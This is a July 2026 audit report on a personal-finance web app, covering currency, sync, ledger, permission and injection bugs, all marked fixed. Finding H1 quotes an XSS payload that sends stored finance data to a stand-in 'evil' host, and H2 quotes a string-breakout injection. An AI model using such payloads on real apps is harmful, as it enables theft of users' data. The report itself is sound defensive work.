# Legacy-web audit — July 2026

Four parallel deep audits (money/FX, persistence/sync, ledger logic, UI/injection) plus a
self-review of the July 2026 category-picker and payment-method work. Findings already
resolved in `ARCHITECTURE_AUDIT.md` were excluded.

Every item below was traced against real source. Items marked **verified** were additionally
reproduced with a concrete numeric example or an executed script.

**Totals:** 8 critical · 8 high · 9 medium · 7 low

## Status

**FIXED** — all 8 criticals; the escaping trio H1, H2, H3 (H2 was introduced by
this session's own payment-method work); and the family-sharing set H6, H8, H9
and M8; H7; the FX pair H4 and H5; H10; and the entire medium/low batch.
**All 32 findings are closed.** Every fix carries a regression test that was
verified to FAIL against the pre-fix code, so none of them is a test that could
never go red. Run everything with `npm run smoke` (249 assertions across seven
files).

While fixing H1 a related leak surfaced and was closed: `CurrencyService.formatMoney`
echoed an unrecognised currency code back verbatim on its `Intl` fallback path, so a
hostile `currency` string reached innerHTML through the money formatter that every view
calls. Non-ISO codes now render as `?`.

**OPEN** — nothing.

M3 was closed by making `toHijri()` stamp the offset it used onto every
snapshot, so `BudgetService` can evaluate "today" in the SAME epoch a given
transaction was recorded in. History stays frozen (the user's choice) and the
two sides of the comparison finally agree. `StateMigrator` back-fills existing
snapshots with the current offset, which reproduces today's behaviour exactly
for anyone whose offset never changed.

Behaviour decisions taken with the user, rather than inferred:
deleting a recurring occurrence now records a skip so it never regenerates;
deleting a debt asks whether to keep or remove its transactions (keeping now
retains the ORIGINAL too, so balances don't move); "mark as fully paid off"
asks whether the remainder was just paid — logging a real settlement
transaction — or settled outside the app; and deleting a regular item keeps
everything ever logged from it.

The family live-sync path (instant bidirectional add/delete) is a deliberate
feature. `src/__smoke__/sharing.smoke.mjs` now guards that contract with seven
round-trip assertions that run before any security assertion in the file — any
future change to `#pullMemberContributions`, `#pushFamilyShares`,
`submitContribution`, `updateContribution`, `deleteContribution` or the realtime
channels must keep them green.

H7 was fixed centrally rather than by adding ~20 calls: `Store` now has a
local-change hook that schedules a push after any successful local persist.
`replaceState()`/`reset()` are excluded (they apply remote or seed data), and
`Store.withoutLocalChange()` suppresses it where sync or the FX cache persists
state it has already committed — otherwise every pull and every rate refresh
would ping-pong a version bump to all other devices.

H4/H5: a transfer's currency is now locked to the SOURCE account (money can
only leave an account in that account's own currency), which removes the
mismatch between the amount and the rate the FX panel quotes. And an auto rate
that the user never touched is booked at full precision rather than at the 6dp
value shown in the field — the field still displays 6dp, but a rate matching
that rendering is treated as "unchanged" and the exact value is used. A manually
entered rate always wins.

Permission model now enforced owner-side (FAMILY_ACCESS_LEVELS): `add`/`edit`/`full`
may add; `edit`/`full` may replace their own row via a `_replace` marker;
only `full` may delete. Rejected contributions are consumed rather than retried,
and the owner is told how many were blocked.

## Critical — money is wrong or data is lost

### ✅ C1. Changing an account's currency fabricates a huge "Balance adjustment" — verified
`src/app.js:1575-1595`

`wasMajor = a.balance` is read in the **old** currency's minor units and compared against
`newMinor = toMinor(data.balance, data.currency)` in the **new** currency. `AccountModal.js:28`
prefills the balance field, so a user who changes only the currency and leaves the number alone
still trips the mismatch.

> JPY account holding ¥500,000, field prefilled `500000`. Switch currency to USD only.
> `newMinor = 50,000,000` vs `wasMajor = 500,000` → an **income transaction of $495,000.00**
> is written to the ledger.

Compounding it, `#accounts.update()` runs *before* the comparison and re-derives `a.balance`,
so the baseline is stale as well.

**Fix:** convert the old balance into the new currency before diffing, and skip the adjustment
entirely when only the currency changed.

### ✅ C2. CSV import silently rewrites the currency of existing accounts — verified
`src/app.js:2600-2605`

The "dominant currency" override loop iterates `state.accounts` (all of them) instead of the
accounts created by this import. It also assigns `a.currency` directly rather than through
`AccountService.update()`, so frozen `acctMinor` values are never cleared.

> Existing "Cash" in JPY holding ¥500,000. Import one row `Cash,…,12.00,USD` → the account
> flips to USD, the stale `acctMinor` is reinterpreted, and the balance reads **$5,000.00**.

**Fix:** restrict the override to `plan.newAccounts` ids.

### ✅ C3. Switching a transfer to expense/income orphans the paired leg — verified
`src/app.js:818`, `src/domain/services/TransactionService.js:182,214`

The mirror branch requires `data.type === 'transfer' && tx.type === 'transfer'`. Switching an
existing transfer to Expense falls through to `TransactionService.update()`, whose own mirror
block tests `tx.type === 'transfer'` *after* `Object.assign` has already overwritten it.

> Transfer A→B for 100. Reopen, click **Expense**, save. A is debited 100 as an expense **and**
> B keeps its `transferDir:'in'` credit of 100 — 100 created from nothing. Deleting the row
> afterwards leaves the orphan leg pointing at a dead `transferPairId` forever.

**Fix:** when the old type is transfer and the new one isn't, delete the pair row and clear
`transferPairId` / `transferDir` / `transferRate`.

### ✅ C4. Switching an expense to transfer creates a one-legged, zero-impact row — verified
`src/app.js:818,847-856`, `src/domain/services/LedgerMath.js:44-52`

Same guard, opposite direction. `type` becomes `'transfer'` with no `transferPairId` and no
`transferDir`; the chosen destination account is discarded. `LedgerMath` computes `s = 0` for a
missing direction, so the row contributes **nothing** to any balance.

> A 500 expense switched to Transfer still renders at 500 in every list but silently stops
> affecting the source account and never credits the destination.

**Fix:** route this case through the two-leg creation path at `app.js:860-886`.

### ✅ C5. A failed pull leaves `#cloudVersion = 0`, and the next push blind-overwrites the cloud
`src/domain/services/SyncService.js:235-261,296-333`

`#commitState` treats `expected === 0` as "no row exists yet" and upserts with no
`.eq('version')` guard. `#doPull`'s catch block swallows every error and leaves the version at 0.

> Sign in while offline (or during a transient Supabase 5xx) → pull fails → edit anything →
> the entire cloud row is replaced by this device's local state, which is **seed data** if
> localStorage was empty. Version resets to 1.

**Fix:** represent "cloud version unknown" as `null`, distinct from 0, and refuse to push until
a pull has succeeded.

### ✅ C6. A pull mid-debounce silently discards the just-saved local edit
`src/domain/services/SyncService.js:210-216,296-318`

`#doPull` calls `replaceState` wholesale. There is no dirty-tracking, no merge, and the pending
1000 ms `#saveTimer` is neither cleared nor re-armed.

> t=0 save a transaction (push queued for t=1000). t=300 a realtime UPDATE from another device
> triggers a pull → `replaceState` wipes the transaction from memory *and* localStorage.
> t=1000 the push uploads the clobbered state.

The CAS-conflict path at `:268-272` has the same defect while its toast claims "merging…" —
`#doPull()` performs no merge.

**Fix:** queue un-pushed changes and re-apply after `replaceState`, or flush the debounce first.

### ✅ C7. An involuntary sign-out wipes local storage before pending changes are pushed
`src/domain/services/SyncService.js:126-132,176-187`, `src/core/Store.js:171-177`

`#resetToGuest` calls `store.reset()` → `repository.clear()`. The `SIGNED_OUT` event fires not
only on explicit sign-out but on a **failed token refresh** (the code's own comment says so).

> Edit at t=0 (push queued t=1000); token refresh fails at t=200 after sleep/offline →
> localStorage cleared; at t=1000 `#doPush` returns early because `#user` is null. The edit is
> gone locally and never reached the cloud.

**Fix:** on a non-explicit sign-out, flush a final push or retain the snapshot under a recovery key.

### ✅ C8. `importJson` replaces state with unvalidated JSON and no migration
`src/app.js:2396`, `src/core/Store.js:140-148`

`replaceState(parsed)` runs with the default no-op migrate, and `replaceState` **deletes every
key absent from the incoming object**. Validation is only `parsed.accounts && parsed.transactions`.

> Import a partial or older export → `user`, `categories`, `budgets`, `debts`, `regularItems`,
> `family`, `merchantCategories` are deleted and persisted immediately. An export predating
> `openingBalance` also skips `StateMigrator`, so every account balance silently drops to its
> bare ledger sum.

**Fix:** `replaceState(parsed, (s) => StateMigrator.migrate(s))`; same for `resetData` at `:2679`.

## High

### ✅ H1. Family-share snapshot fields render raw into attributes and inline handlers — verified
`src/ui/views/AccountsView.js:141-152`, `FamilyView.js:163-166`,
`AccountDetailView.js:161-184`, `src/ui/modals/TransactionModal.js:458,466`

`state._sharedData` is another user's verbatim snapshot. `a.name` is escaped; `a.id`, `a.color`,
`a.icon`, `a.type` and `a.currency` are not. `TransactionRowRenderer.js:110-150` does the same
job correctly via `Html.color` / `Html.icon` / `Html.js`, so this is an inconsistency rather
than a design decision.

> A family member sets their account's `icon` to
> `wallet"><img src=x onerror="fetch('//evil/?d='+localStorage.getItem('pocket_state'))">`.
> It fires the moment the victim opens **Accounts** — no click required.

**Fix:** route every `_sharedData` field through the `Html.*` helpers.

### ✅ H2. HTML-escaping is not sufficient inside inline-handler JS strings — verified
`src/ui/components/PaymentMethodSheet.js:189,195` *(introduced in this session)*,
`src/ui/views/TransactionsView.js:295`, `src/ui/modals/TransactionModal.js:579`

The HTML tokenizer decodes character references in attribute values *before* the value becomes
the handler body, so `&#39;` does not protect a single-quoted JS string. Confirmed by parsing
`<button onclick="edit('O&#39;Brien')">` — the attribute comes back as `edit('O'Brien')`, which
throws `SyntaxError: missing ) after argument list`.

> Manage methods → name a method `Wife's card`. Its Rename and Delete buttons are permanently
> dead. `x');alert(1);//` executes instead.

**Fix:** use `Html.js()` in handler positions (`'` survives entity decoding).
`Html.escape()` stays correct for text and attribute content.

### ✅ H3. Filter chips interpolate free text into `onclick` with no escaping
`src/ui/views/TransactionsView.js:198-201,295`

`onclick="…txFilterToggle('${field}','${v}')"` — the label is escaped, `v` is not. For
`paymentTypes`, `v` is a user-authored method name (also settable from a CSV column).

### ✅ H4. Transfer FX rate is derived from account currencies but applied to the tx currency — verified
`src/app.js:751-763` vs `:1372-1399`

`#transferFields` never calls `onTxAccountChange`, so the currency dropdown stays on
`user.defaultCurrency` while the FX panel derives its rate from the two account currencies.

> Default USD; transfer INR savings → AED card, amount 10000. Panel says "You'll receive
> AED 441.89". Saved: source debited **₹831,200 ($10,000)**, destination credited **AED 441.89
> ($120.31)**. The legs are off by ~$9,880.

**Fix:** force the transaction currency to the source account's currency for transfers.

### ✅ H5. Auto FX rate is truncated to 6 dp and then used as the booked rate — verified
`src/app.js:1384,1411,1477,1499`; `TransactionModal.js:440,516`

`autoRate.toFixed(6)` is written into the form field and `submitTx` uses that value verbatim.

> 100,000,000 LBP → USD books **$1,100.00** against an exact **$1,117.32** — 1.55% off.
> VND −0.80%, IDR +0.48%. For transfers this also breaks leg reconciliation.

**Fix:** display 6 dp but keep full precision behind it.

### ✅ H6. Editing a shared transaction duplicates it in the owner's ledger
`src/app.js:699`, `src/ui/modals/TransactionModal.js:185-190,290`

`openSharedTxEdit` passes only `sharedTxMode.editTxId`, so `editing` stays null, the form
submits with an empty id, the `!id` shared branch runs, and a **new** contribution id is minted.
`editTxId` is never read in `app.js`.

### ✅ H7. ~20 mutations persist locally but never call `schedulePush`
`src/app.js:502-520,621-670,1645-1652,1753-1770,1908-1926,2246-2262,2396,2680`

Home currency, date format, Hijri offset, Gemini key, `deleteAccountGroup`,
`reconcileRecalculate` (which mutates `openingBalance`), debt edits and mark-paid, currency
setup. There is no periodic push and no `beforeunload` flush, so the next pull reverts them
silently.

**Fix:** fire `schedulePush()` from one `state:changed` hook instead of ~30 hand-written sites.

### ✅ H8. Removing a family member does not revoke their access
`src/app.js:2074-2081`, `src/domain/services/SyncService.js:515-546`

`deleteFamilyMember` only filters `state.family`; the `family_shares` row is never deleted, and
`#pushFamilyShares` returns early when the list is empty, so no cleanup upsert is issued. The
removed member's client keeps returning the last snapshot — all shared accounts, matching
transactions and **all categories** — indefinitely.

### ✅ H9. The owner applies member-supplied `tx_data` with no permission validation
`src/domain/services/SyncService.js:603-651`

`deleteIds` comes straight from member-controlled `tx_data.targetId`;
`state.family[].permissions` is never consulted. Permission is enforced only in render code.
Non-adversarially: downgrade a member to `view`, their stale client submits a contribution,
the owner applies it anyway.

### ✅ H10. Amount-filter inputs lose focus after every keystroke
`src/ui/views/TransactionsView.js:276,280`

`oninput` → full `#render()`; focus restoration only covers elements carrying `data-focus-key`,
which these two lack. Typing `25` needs a re-click between the `2` and the `5`.
